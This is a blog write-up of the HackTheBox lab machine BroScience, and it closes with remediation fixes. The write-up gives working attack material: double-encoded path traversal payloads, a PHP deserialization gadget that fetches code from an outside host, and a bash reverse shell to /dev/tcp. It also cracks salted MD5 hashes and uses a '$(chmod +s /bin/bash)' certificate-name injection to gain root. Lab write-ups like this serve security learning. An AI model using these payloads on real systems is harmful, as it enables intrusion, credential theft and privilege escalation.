--- 
title: "HTB BroScience | Linux   Medium"
author: ""
date: 2023-04-14T19:08:50+02:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
HackTheBox Broscience is a Linux machine rated Medium. This machine is flawed with broken access control(A01:2021), cryptographic failures(A02:2021), software and data integrity failures(A08:2021), and injection(A03:2021).

Attack Chain: An initial source code disclosure caused by a directory traversal vulnerability, improper implementation of activation token, and exploiting an insecure deserialization gave the attacker an initial foothold. Further exploiting a shell injection vulnerability within a certificate renewal script elevated the attacker's privileges to the root user.

##### Initialization
```bash
# connect to vpn
sudo openvpn --auth-nocache --config lab_kralyn.ovpn
``` 

##### Enumeration
```bash
# discover ports and services
nmap --max-rate=500 -sC -sV -Pn -sS -sU -vvv -oA nmap_broscience 10.10.11.195
xsltproc nmap_broscience.xml -o nmap_broscience.html         # converts xml to html
firefox nmap_broscience.html      # view in browser
#--snip--#
22/tcp open  OpenSSH 8.9p1 Ubuntu 3 
80/tcp open  Apache httpd 2.4.54 (GET HEAD POST OPTIONS)
443/tcp open Apache httpd 2.4.54 ((Debian)) (GET HEAD POST OPTIONS)

# discover technologies used
whatweb 10.10.11.195        # if domain exits add to host file and rerun command
#--snip--#
HTTPServer[Debian Linux][Apache/2.4.54 (Debian)]
RedirectLocation[https://broscience.htb/]

Cookies[PHPSESSID]
HTTPServer[Debian Linux][Apache/2.4.54 (Debian)]

# add domain to hosts file
echo '10.10.11.195 broscience.htb' | sudo tee -a /etc/hosts

# investigate existing headers
curl -I -k https://broscience.htb
#--snip--#
HTTP/1.1 200 OK
Date: Wed, 12 Apr 2023 10:21:00 GMT
Server: Apache/2.4.54 (Debian)
Set-Cookie: PHPSESSID=qve1s0q4jdkaommnqfnkai8ls2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8

``` 

```bash
# discover subdomains
# with ffuf
ffuf -c -u https://broscience.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.broscience.htb' -t 50 -ac -s

# with gobuster
gobuster vhost -u http://10.10.11.195 -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt

gobuster dns -d broscience.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 30

# wfuzz
wfuzz -c -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://broscience.htb/ -H 'Host: FUZZ.broscience.htb' --hc 200
```

```bash
# discover directories
# with ffuf
ffuf -c -u https://broscience.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -ac -s

# with gobuster
gobuster dir -u https://broscience.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -k -q
#--snip--#
/images        301
/includes      301 
/manual        301
/styles        301
/javascript    301

# with dirsearch
dirsearch -u https://broscience.htb/ -t 50 -q
#--snip--#
/login.php           200
/includes/           200
/images/             200
/index.php           200
/logout.php          302
/javascript          301
/manual/index.html   200
/manual/             301
/register.php        200
/user.php            200

# with wfuzz
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt --hc 404 -t 50  https://broscience.htb/FUZZ
#--snip--#
/register.php    200
/index.php       200
/login.php       200
/.htaccess       403
/user.php        200
/comment.php     302
/activate.php    200
/logout.php      302
/update_user.php 302
```

##### Exploration
I tried registering but there was no way to intercept the activation link. Then I explored the resulting paths from the directory discovery. The `includes` and `user.php` appeared interesting. On checking the `user.php` I encounter an error `Missing ID value`. Tried the user.php again with parameter key `id`  using values 1 through 5 which return some user detail but no credential or anything juicy. 
```shell
curl -s -k https://broscience.htb/user.php?id=1 | html2text
<<SNIP
BroScience
    * Log_In
****** administrator ******
  Member since
      4 years ago
  Email Address
      administrator@broscience.htb
  Total exercises posted
      3
  Total comments posted
      1
  Is activated
      Yes
  Is admin
      Yes
SNIP
```
In the includes path all the files therein displayed an empty page except for img.php which requested a `path` parameter. Tried this path again with the parameter key `path` and value `../../../etc/passwd`. This threw an error `Attack detected`. This application could possibly be vulnerable to [Directory Traversal](https://www.invicti.com/learn/directory-traversal-path-traversal/). Added the host to scope, then crawl and audited it with Burp. And tried variations of this [payload](https://github.com/payloadbox/rfi-lfi-payload-list). This payload `%252e%252e%252f` a double encoding of `../` as identified with burpsuite looked promising as it did not return 'Error: Attack detected.'. After several trials, double encoded `../../../../etc/passwd` and dumped the contents of the file. While researching, found and installed a [urlencoder/urldecoder utility](https://www.urlencoder.net/linux-urlencode) which helped with the double encoding process. 
```shell
curl -sk 'https://broscience.htb/includes/img.php?path=../../../etc/passwd' | html2text
#--snip--#
Error: Attack detected.

curl -sk https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../../../../etc/passwd)) | grep sh$     # get the users with shell
#--snip--#
root:x:0:0:root:/root:/bin/bash
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

# let's exfiltrate the interesting files in the includes directory
curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../includes/db_connect.php)) -o db_connect.php    # get the db_connect file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../includes/img.php)) -o img.php    # get img file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../includes/utils.php)) -o utils.php    # get utils file

```

**Automated Path Traversal Technique**
```shell
# download payload
wget https://raw.githubusercontent.com/foospidy/payloads/master/other/traversal/dotdotpwn.txt   

# with ffuf
ffuf -c -s -ac -u https://broscience.htb/includes/img.php?path=FUZZ -w dotdotpwn.txt -t 50 -fs '0-30' -mc '200' 
<<SNIP
..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
.%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd
.%2e%252f.%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd
.%2e%252f.%2e%252f.%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd
%2e.%252f%2e.%252f%2e.%252f%2e.%252fetc%252fpasswd
%2e.%252f%2e.%252f%2e.%252f%2e.%252f%2e.%252fetc%252fpasswd
%2e.%252f%2e.%252f%2e.%252f%2e.%252f%2e.%252f%2e.%252fetc%252fpasswd
%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd
%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd
SNIP

# with gobuster
gobuster fuzz -u https://broscience.htb/includes/img.php?path=FUZZ -w dotdotpwn.txt  -t 50 -k -q --exclude-length '0,27,30' -b '404'
<<SNIP
Found: [Status=200] [Length=2235] https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd
Found: [Status=200] [Length=2235] https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
Found: [Status=200] [Length=2235] https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
Found: [Status=200] [Length=2235] https://broscience.htb/includes/img.php?path=.%2e%252f.%2e%252f.%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd
Found: [Status=200] [Length=2235] https://broscience.htb/includes/img.php?path=.%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd                  
Found: [Status=200] [Length=2235] https://broscience.htb/includes/img.php?path=.%2e%252f.%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd         
Found: [Status=200] [Length=2235] https://broscience.htb/includes/img.php?path=%2e.%252f%2e.%252f%2e.%252f%2e.%252fetc%252fpasswd 
SNIP

# with wfuzz
wfuzz -c -u https://broscience.htb/includes/img.php?path=FUZZ -w dotdotpwn.txt -t 50 --filter "c=200 and w>50"
<<SNIP
000000157: 200 39 L  64 W  2235 Ch  "..%252f..%252f..%252f..%252fetc%252fpasswd"       
000000165: 200 39 L  64 W  2235 Ch  "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"          
000000161: 200 39 L  64 W  2235 Ch  "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
000005197: 200 39 L  64 W  2235 Ch  ".%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd"                
000005201: 200 39 L  64 W  2235 Ch  ".%2e%252f.%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd"       
SNIP
```
Studied the code in exfiltrated files. `db_connect.php` displays a postgres engine database credentials not publicly accessible. The `img.php` filters some words, decodes the path before displaying the passed file using a known php function, `file_get_contents`, vulnerable to directory traversal. Leveraged chat-gpt in understanding the `utils.php`
[db_connect.php](#db_connect.php)
```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```
[img.php](#img.php)
```php
<?php
if (!isset($_GET['path'])) {
    die('<b>Error:</b> Missing \'path\' parameter.');
}

// Check for LFI attacks
$path = $_GET['path'];

$badwords = array("../", "etc/passwd", ".ssh");
foreach ($badwords as $badword) {
    if (strpos($path, $badword) !== false) {
        die('<b>Error:</b> Attack detected.');
    }
}

// Normalize path
$path = urldecode($path);

// Return the image
header('Content-Type: image/png');
echo file_get_contents('/var/www/html/images/' . $path);
?>
```
[utils.php](#utils.php)
```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
function rel_time($from, $to = null) {
    $to = (($to === null) ? (time()) : ($to));
    $to = ((is_int($to)) ? ($to) : (strtotime($to)));
    $from = ((is_int($from)) ? ($from) : (strtotime($from)));

    $units = array
    (
        "year"   => 29030400, // seconds in a year   (12 months)
        "month"  => 2419200,  // seconds in a month  (4 weeks)
        "week"   => 604800,   // seconds in a week   (7 days)
        "day"    => 86400,    // seconds in a day    (24 hours)
        "hour"   => 3600,     // seconds in an hour  (60 minutes)
        "minute" => 60,       // seconds in a minute (60 seconds)
        "second" => 1         // 1 second
    );

    $diff = abs($from - $to);

    if ($diff < 1) {
        return "Just now";
    }

    $suffix = (($from > $to) ? ("from now") : ("ago"));

    $unitCount = 0;
    $output = "";

    foreach($units as $unit => $mult)
        if($diff >= $mult && $unitCount < 1) {
            $unitCount += 1;
            // $and = (($mult != 1) ? ("") : ("and "));
            $and = "";
            $output .= ", ".$and.intval($diff / $mult)." ".$unit.((intval($diff / $mult) == 1) ? ("") : ("s"));
            $diff -= intval($diff / $mult) * $mult;
        }

    $output .= " ".$suffix;
    $output = substr($output, strlen(", "));

    return $output;
}

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

function get_theme_class($theme = null) {
    if (!isset($theme)) {
        $theme = get_theme();
    }
    if (strcmp($theme, "light")) {
        return "uk-light";
    } else {
        return "uk-dark";
    }
}

function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```
[chat-gpt-util.php-response](#chat-gpt-util.php-response)
```text
The first function `generate_activation_code()` generates a random 32-character activation code composed of lowercase and uppercase letters and numbers.

The second function `rel_time()` takes two optional parameters `$from` and `$to` that represent timestamps and returns a human-readable string representing the time difference between them. The string contains a numerical value and a unit of time (year, month, week, day, hour, minute, or second) and ends with the word "ago" or "from now", depending on which timestamp is more recent.

The class `UserPrefs` represents a user's preferences and has a single public property `$theme` that defaults to "light" when an object is instantiated.

The function `get_theme()` retrieves the current user's theme preference from a cookie named "user-prefs". If the cookie does not exist, it creates a new cookie with a default value of light. It then deserializes the cookie value into a `UserPrefs` object and returns the theme property. If there is no active session, it returns "light" by default.

The function `get_theme_class()` takes an optional `$theme` parameter and returns a CSS class name based on the value of `$theme`. If `$theme` is not set, it calls `get_theme()` to retrieve the current user's theme preference. If the theme is "light", it returns "uk-light". Otherwise, it returns "uk-dark".

The function `set_theme()` takes a value and sets the user's theme preference to it by updating the "user-prefs" cookie.

The class `Avatar` represents a user's avatar and has a single public property `$imgPath` that represents the path to the avatar image file. It has a single public method `save()` that takes a temporary file path and saves the file to `$imgPath`.

The class `AvatarInterface` is a special class that is used for serialization and deserialization of `Avatar` objects. It has two public properties, `$tmp` and `$imgPath`, that are used to store the temporary file path and the avatar image path, respectively. The magic method `__wakeup()` is called when an object is unserialized, and it creates a new `Avatar` object and calls its `save()` method with the stored temporary file path.

There are several functions in this code that may be vulnerable depending on how they are used. Here are some potential issues:

1.  `srand(time())`: The `srand()` function is used to seed the random number generator, which is then used to generate activation codes. The use of `time()` as the seed can be problematic because it means that the same seed is used each time the script is executed, which can make it easier for attackers to guess the activation code.
    
2.  `rand(0, strlen($chars) - 1)`: The `rand()` function is used to generate random numbers for use in generating activation codes. However, the use of `rand()` for cryptographic purposes is not recommended because it is not a cryptographically secure random number generator. This can make it easier for attackers to guess the activation code.
    
3.  `strtotime()`: The `strtotime()` function is used to convert strings to Unix timestamps, which are then used in the `rel_time()` function. However, if the input string is not properly validated, it can be vulnerable to injection attacks.
    
4.  `unserialize()` and `base64_decode()`: The `unserialize()` and `base64_decode()` functions are used to unserialize data from cookies. These functions can be dangerous if used improperly because they can be used to execute arbitrary code. Attackers can exploit vulnerabilities in these functions to execute code on the server, which can lead to a compromise of the system.
    
5.  `fwrite()`: The `fwrite()` function is used to write data to a file, which can be dangerous if used improperly. Attackers can use this function to write malicious code to the server, which can then be executed.
    
6.  `file_get_contents()`: The `file_get_contents()` function is used to read data from a file, which can be dangerous if used improperly. Attackers can use this function to read sensitive information from the server.
```

We earlier saw that after a new user has created an account they need to verify the account with an activation link. We will exploit `generate_activation_code()` to generate the activation code so that we can successfully login. Intercept the registration with burp and use the repeater tool to complete the process. Copy the date from the response and use it for generating the activation code. See broscience01

![Register User](/images/broscience/broscience01.png "Register User")

[generate-activation-code.php](#)
```php
# adapted activation function
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(strtotime("Mon, 09 Jan 2023 15:46:02 GMT"));
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
print generate_activation_code();
?>
```
After generating the activation code, I needed to apply it somewhere to get the newly created account activated. Then I recalled that the directory discovery returned some other paths. I had to exfiltrate all the discovered files.
```shell
curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../activate.php)) -o activate.php    # get activate file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../register.php)) -o register.php    # get register file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../login.php)) -o login.php    # get login file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../index.php)) -o index.php    # get index file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../user.php)) -o user.php    # get user file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../comment.php)) -o comment.php    # get comment file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../update_user.php)) -o update_user.php    # get update user file

curl -k https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../logout.php)) -o logout.php    # get logout file

```
[activate.php](#activate.php)
```php
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
    header('Location: /index.php');
}

if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
    if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
        // Check for code in database
        include_once 'includes/db_connect.php';

        $res = pg_prepare($db_conn, "check_code_query", 'SELECT id, is_activated::int FROM users WHERE activation_code=$1');
        $res = pg_execute($db_conn, "check_code_query", array($_GET['code']));

        if (pg_num_rows($res) == 1) {
            // Check if account already activated
            $row = pg_fetch_row($res);
            if (!(bool)$row[1]) {
                // Activate account
                $res = pg_prepare($db_conn, "activate_account_query", 'UPDATE users SET is_activated=TRUE WHERE id=$1');
                $res = pg_execute($db_conn, "activate_account_query", array($row[0]));
                
                $alert = "Account activated!";
                $alert_type = "success";
            } else {
                $alert = 'Account already activated.';
            }
        } else {
            $alert = "Invalid activation code.";
        }
    } else {
        $alert = "Invalid activation code.";
    }
} else {
    $alert = "Missing activation code.";
}
?>

<html>
    <head>
        <title>BroScience : Activate account</title>
        <?php include_once 'includes/header.php'; ?>
    </head>
    <body>
        <?php include_once 'includes/navbar.php'; ?>
        <div class="uk-container uk-container-xsmall">
            <?php
            // Display any alerts
            if (isset($alert)) {
            ?>
                <div uk-alert class="uk-alert-<?php if(isset($alert_type)){echo $alert_type;}else{echo 'danger';} ?>">
                    <a class="uk-alert-close" uk-close></a>
                    <?=$alert?>
                </div>
            <?php
            }
            ?>
        </div>
    </body>
</html>
```
Run the `generate-activation-code.php` snippet again, and copy the output and use it on the `/activate.php` page as shown in broscience02. We can now log in with the created user details.

![Activate User Registration](/images/broscience/broscience02.png "Activate User Registration")

##### Exploitation
Earlier while reading the `utils.php` file we noticed a serialization and deserialization function and as explain by chat-gpt these could be an attack vector. See [Introduction to Insecure Deserialization in PHP - Conviso](https://blog.convisoappsec.com/en/introduction-to-insecure-deserialization-in-php/) for serialization-deserialization attack. The succeeding classes Avatar and Avatar interface aided in getting an initial foothold via a [cookie poisoning attack](https://www.invicti.com/learn/cookie-poisoning/). We will create a php reverse shell scripts and construct a serialized object with the following snippet.
[foothold.php](#foothold.php)
```php
// foothold.php reverse shell
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/9011 0>&1'"); ?>
```

[serializer.php](#serializer.php)
```php
// serializer.php
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.6:8011/foothold.php";
    public $imgPath = "./foothold.php";

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

echo base64_encode(serialize(new AvatarInterface));
?>

```

Now generate the serialized object using `php serializer.php | tr -d '='` and insert it into the cookie `user-prefs` as shown in broscience03. With a extra three horizontally spilted terminal, start a python server on terminal one, an nc listener on terminal two, and on terminal three curl the uploaded php reverse shell script. Refresh the browser and execute the curl command. See brosciene04.

![Poison Cookie](/images/broscience/broscience03.png "Poison Cookie")

![Initial Foothold](/images/broscience/broscience04.png "Initial Foothold")

```shell
# upgrade to a full tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=xterm-256color; stty rows 38 columns 116; reset;  # hit enter

# recall we looted a database credentials so lets use it.
ss -tpln                      # list open tcp ports
#--snip--#
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          
LISTEN 0      244        127.0.0.1:5432      0.0.0.0:*    

cd ~   # change directory to current user's home
# connect and explore the database
psql -h 127.0.0.1 -p 5432 -U dbuser -d broscience -W   # on prompt submit password: RangeOfMotion%777
\dt                           # list tables
select * from users;          # explore the users table
select username,password from users;      # select specific columns
#--snip--#
| username    |             password             
|-------------|----------------------------------
administrator | 15657792073e8a843d4f91fc403454e1 
bill          | 13edad4932da9dbb57d9cd15b66ed104
michael       | bd3dad50e2d578ecba87d5fa15ca5f85 
john          | a7eed23a7be6fe0d765197b1027453fe 
dmytro        | 5d15340bded5b9395d5d14b9c21bc82b 
\q

# prepare the above ready for cracking and save as broscience.hash
administrator:15657792073e8a843d4f91fc403454e1 
bill:13edad4932da9dbb57d9cd15b66ed104
michael:bd3dad50e2d578ecba87d5fa15ca5f85 
john:a7eed23a7be6fe0d765197b1027453fe 
dmytro:5d15340bded5b9395d5d14b9c21bc82b 
```
The passwords are salted with `NaCl` prefix as revealed by the `login.php` file. So we generate a specialised wordlist.

```shell
# crafted wordlist 
sed 's/^/NaCl/' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > broscience_wordlist.txt

# since the code already hinted we are dealing with md5 hashtype let's crack on
# with hashcat
hashcat -m 0 --username broscience.hash broscience_wordlist.txt -O
hashcat -m 0 --username broscience.hash --show
#--snip--#
bill:13edad4932da9dbb57d9cd15b66ed104:NaCliluvhorsesandgym
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl2applesplus2apples
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaClAaronthehottest

# with john the ripper
john --list=format-details --format=Raw-MD5
john -w:broscience_wordlist.txt broscience.hash --format=Raw-MD5
john broscience.hash --format=Raw-MD5 --show
---snip---
bill:NaCliluvhorsesandgym
michael:NaCl2applesplus2apples
dmytro:NaClAaronthehottest

# from earlier directory traversal information disclosure we know that root, bill and postgres users have shell login in this machine.
# now drop into the machine as user bill
ssh bill@broscience.htb          # submit password on prompt: iluvhorsesandgym
ls -lah                          # list all content
cat user.txt                     # capture the user flag.
```

##### Escalation
```bash				       
sudo -l					# users sudo right - none

# upload linpeas.sh and pspy
chmod +x pspy      
./pspy | tee -a psout    # pspy investigation
---snip---
CMD: UID=0    PID=32917  | /bin/bash /root/cron.sh 
CMD: UID=0    PID=32918  | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt

chmod +x linpeas.sh 
./linpeas.sh | tee -a linout    # linpeas investigation
---snip---
╣ Unexpected in /opt (usually empty)
-rwxr-xr-x  1 root root 1806 Jul 14  2022 renew_cert.sh
```

[/opt/renew_cert.sh](#)
```shell
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;

```

The file is owned by root, read by group and executed by all. It checks that existing certificate expiry remains one day and then renew it. And then it moves the renewed .crt to Certs directory in bills home directory and uses the commonName as the name of the file. Since it runs under with the root user and interpolates the common name from the system stored common name variable, we will get it to set the bash utility with the setuid permission i.e `$(chmod +s /bin/bash)` while moving the file to the Certs directory. Generate certificate with one day to expiry in the Certs folder so the cron can trigger a renewal and inadvertently execute our setuid script after 10 seconds.

```shell
cd Certs       # change into the Certs directory

# create the self-signed certificate named broscience and for 'Common Name (e.g. server FQDN or YOUR name) []:' $(chmod +s /bin/bash)
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1 

# check expiry date
openssl x509 -enddate -noout -in broscience.crt

# after 10 seconds list /bin/bash
ls -la /bin/bash
#--snip--#
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash

bash -p
whoami       # user is effectively root
cat /root/root.txt    # capture the root flag
```

###### Exfiltration
Collect the source code and helper scripts for further analysis.
```shell
# start a python server on the victim's machine
python3 -m http.server 8098

# download all contents of the /root unto the attacker's machine
get -R "index.html*" -c -r -L -p -nc -nH -P source  http://10.10.11.195:8098/

cd source    # change directory into source

# remove superfluous files and folders
rm -fr .local .cache .profile .viminfo .bashrc .bash_history root.txt
```

###### Remediation
**Fixing the Foothold Vector**  
Although the developer tried preventing the path traversal vulnerability by comparing the user input against a blacklist words - whilelisting is mostly advised, the `file_get_contents` and  `__wakeup`  functions were the culprits that enabled a foothold on the system.  See reference for [properly implementing php's `file_get_contents`](https://stackoverflow.com/questions/6085496/php-directory-traversal-issue/6085523#6085523).
[fixed img.php](#)
```php
<?php
if (!isset($_GET['path'])) {
    die('<b>Error:</b> Missing \'path\' parameter.');
}

// Check for LFI attacks
$path = $_GET['path'];

$badwords = array("../", "etc/passwd", ".ssh");
foreach ($badwords as $badword) {
    if (strpos($path, $badword) !== false) {
        die('<b>Error:</b> Attack detected.');
    }
}

// Normalize path
$path = urldecode($path);

// Return the image
header('Content-Type: image/png');
$base_directory = '/var/www/html/images/';
$image = basename($path);
echo file_get_contents($base_directory.$image);
?>
```

```shell
# reload configs and restart the apache server
systemctl daemon-reload
systemctl restart apache2
```

![Foothold Vector Fixed](/images/broscience/broscience05.png "Foothold Vector Fixed")

The developer's approach to implementing the `generate_activation_code()` function in `util.php` was flawed because of using a time seed and the `rand` function which is considered [cryptographically insecure](https://www.php.net/manual/en/function.rand.php). It is recommended to use [random_int](https://www.php.net/manual/en/function.random-int.php) for cryptographic purposes.
[`generate_activation_code()` function in util.php fixed](#)
```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[random_int(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

**Fixing the Privilege Escalation Vector**  
The privilege escalation vector is quite common in bash scripts. Interpolating a variable seems harmless until a good attacker worth their salt is able to craft a command that runs at interpolation. This [reference](https://unix.stackexchange.com/questions/379181/escape-a-variable-for-use-as-content-of-another-script/600214#600214) expounded on escaping variables.
[renew_cert.sh fix snippet]
```shell
54    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/${commonName@Q}.crt"
```

###### References
[Double URL Encoding - Imperva](https://docs.imperva.com/bundle/on-premises-knowledgebase-reference-guide/page/double_url_encoding.htm), [Exploiting LFI Vulnerabilities - BlackHat](https://www.blackhatethicalhacking.com/articles/exploiting-lfi-vulnerabilities/), [Git Payloads! A Collection of Web Attack Payloads - Foospidy](https://github.com/foospidy/payloads), [Remote Code Execution through Unsafe Unserialize in PHP - Sjoerd Langkemper](https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/), [Never Pass Untrusted Data to Unserialize in PHP - Invcti](https://www.invicti.com/blog/web-security/untrusted-data-unserialize-php/),[Insecure Deserialization - PortSwigger](https://portswigger.net/web-security/deserialization), [Directory Traversal Attack: Real-life Attacks and Code Examples - BrightSec](https://brightsec.com/blog/directory-traversal-attack/), [PHP Random Number Generator: A Comprehensive Guide to rand(), mt_rand(), and random_int() Functions](https://copyprogramming.com/howto/php-random-number-generator-a-comprehensive-guide-to-rand-mt-rand-and-random-int-functions)



---  
>I build secure and reliable infrastructures, hunt for flaws in insecure systems and remediate them to meet compliance. Book a consultation [session](https://calendly.com/samuelnwoye/10min).